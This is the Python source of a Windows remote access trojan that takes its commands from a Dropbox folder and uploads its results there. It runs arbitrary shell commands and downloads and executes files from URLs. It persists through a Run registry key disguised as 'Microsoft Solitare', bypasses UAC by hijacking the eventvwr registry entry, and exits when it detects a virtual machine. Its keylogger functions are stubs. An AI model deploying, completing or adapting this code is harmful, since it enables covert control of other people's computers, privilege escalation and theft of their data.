from _winreg import *
from win32file import CopyFile
import requests
import os
import dropbox
import time
import threading
import cmd
import platform
import psutil
import json
import base64
import ctypes
import subprocess
import uuid
import sys


apiKey = "CHANGE API KEY"
# Create a dropbox object


dbx = dropbox.Dropbox(apiKey)

agentName = ""

tasks = {}
keyloggerStarted = False
completedTasks = []

def executeBackground(command):
	subprocess.Popen([command.split()])
	return True

def ExecuteShellCommand(command):
	data = ""
	try:
		p = subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
		for output in iter(p.stdout.readline, b''):
			data += output 
	except Exception, err:
		pass
		data = err
	return data



def exec_keylog_start():
	keyloggerStarted = True
	data = "[+] Keylogger Started Successfully [+]"
	#CODE REMOVED
	return base64.b64encode(str(data))

def exec_keylog_stop():
	keyloggerStarted = False
	data = "[+] Keylogger Stopped Successfully [+]"
	#CODE REMOVED
	return base64.b64encode(str(data))

def exec_bypassuac():
	if(ctypes.windll.shell32.IsUserAnAdmin()):
		data = "[+] Agent is running with Administrative Privileges [+]"
	else:
		keyVal = r'Software\Classes\mscfile\shell\open\command'
		try:
			key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
		except:
			key = CreateKey(HKEY_CURRENT_USER, keyVal)
		SetValueEx(key, None, 0, REG_SZ, sys.executable) 
		CloseKey(key)
		os.system("eventvwr")
		data = "[+] Task bypassuac Executed Successfuly [+]"
	return base64.b64encode(str(data))

def exec_cmd(cmd):
	data = ExecuteShellCommand(cmd.split())
	
	return base64.b64encode(str(data))



def exec_persist():
	data = ""
	filedrop = r'%s\Saved Games\%s' % (os.path.expandvars("%userprofile%"),'sol.exe')
	currentExecutable = sys.executable
	try:
		CopyFile (currentExecutable, filedrop, 0)

		keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
		key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
		SetValueEx(key, "Microsoft Solitare", 0, REG_SZ, filedrop)
		CloseKey(key)
		data = "[+] Persistence Completed [+]"
	except Exception:
		pass
		data = "[-] Error while creating persistence [-]"
		
	return base64.b64encode(str(data))

def exec_downloadexecute(url):
	try:
		r = requests.get(url)
		filename = url.split('/')[-1]

		if r.status_code == 200:
			f = open(filename,'wb')
			f.write(r.content)
			f.close()
			executeBackground(filename)
			data = "[+] Task Completed Successfully [+]"
		else:
			data = "[-] Error [-]"
	except Exception, err:
		data = err
	return base64.b64encode(str(data))

def doTask(command,task):
	mode = (dropbox.files.WriteMode.overwrite)
	output = {}
	path = '/%s/output' % agentName
	try:
		_, res = dbx.files_download(path)
	except Exception:
		dbx.files_upload(json.dumps(output),path,mode)
		pass
		_, res = dbx.files_download(path)

	output = json.loads(res.content.replace('\n',''))

	# checks for commands with double parameters.

	if(command.startswith('{SHELL}')):
		
		cmd = command.split('{SHELL}')[1]
		output[task] = {"OUTPUT": exec_cmd(cmd)}
	

	if(command.startswith('{DOWNLOAD}')):
		
		url = command.split('{DOWNLOAD}')[1]
		output[task] = {"OUTPUT": exec_downloadexecute(url)}
	
	elif(command == "persist"):
		output[task] = {"OUTPUT": exec_persist()}
		

	elif(command == "keylog_start"):
		output[task] = {"OUTPUT": exec_keylog_start()}
			
	elif(command == "keylog_stop"):
		output[task] = {"OUTPUT": exec_keylog_stop()}
	
	elif(command == "bypassuac"):
		output[task] = {"OUTPUT": exec_bypassuac()}


	# Upload the output of commands 
	try:
		dbx.files_upload(json.dumps(output),path,mode)
		completedTasks.append(task)
	except Exception:
		time.sleep(30)
		pass

	


class agentNotifier(object):
	
	def __init__(self, interval=20):

		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.daemon = False                           
		thread.start()                                 

	def run(self):
		while True:
			notify()
			time.sleep(self.interval)




class taskChecker(object):
	
	def __init__(self, interval=5):

		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.daemon = False                           
		thread.start()                                 

	def run(self):
		while True:
			checkTasks()
			time.sleep(self.interval)

def checkTasks():
	global tasks
	path = '/%s/tasks' % agentName
	for file in dbx.files_list_folder('/%s/' % agentName).entries:
		if(file.name == 'tasks'):
			_, res = dbx.files_download(path)
			if(res.content != ""):
				tasks = json.loads(res.content.replace('\n',''))
				for task,taskContent in tasks.iteritems():
					if(str(taskContent["STATUS"]) == "Completed"):
						deleteOutputKey(task)
					if(str(taskContent["STATUS"]) == "Waiting" and task not in completedTasks):
						doTask(str(taskContent["COMMAND"]),task)


def firstTime():
	return True

def dropboxFileExists(path,file):
	for fileName in dbx.files_list_folder(path).entries:
		if fileName.name == file:
			return True
	return False


def deleteOutputKey(taskname):
	path = '/%s/output' % agentName
	mode = (dropbox.files.WriteMode.overwrite)
	try:
		if(dropboxFileExists('/%s/' % agentName ,'output')):
			_, res = dbx.files_download(path)
			if(res.content != ""):
				outputData = json.loads(res.content.replace('\n',''))
				del outputData[taskname]
			else:
				outputData = {}
			dbx.files_upload(json.dumps(outputData),path,mode)
	except Exception:
		pass

def notify():
	data = str(time.time())
	path = '/%s/lasttime' % agentName 
	mode = (dropbox.files.WriteMode.add)
	for file in dbx.files_list_folder('/%s/' % agentName).entries:

		if(file.name == 'lasttime'):
			mode = (dropbox.files.WriteMode.overwrite)
			break
	try:
		dbx.files_upload(data,path,mode)
	except Exception:
		pass
		
		time.sleep(30)



def antivm():
	if(psutil.cpu_count() > 2 and platform.release() != 'XP' and firstTime()): # Change 0 to 2 again
		try:
			setAgentName()
			dbx.files_create_folder('/%s' % agentName)
		except Exception,e:
			print e
			pass
	else:
		
		exit(0)

def setAgentName():
	global agentName
	if(ctypes.windll.shell32.IsUserAnAdmin()):
		agentName = "%s-%s%s" % (platform.node(),str(uuid.getnode()),"SYS")
	else:
		agentName = "%s-%s" % (platform.node(),str(uuid.getnode()))
	


def main():
	antivm()
	notifier = agentNotifier()
	taskchecker = taskChecker()

if __name__ == "__main__":
	main()
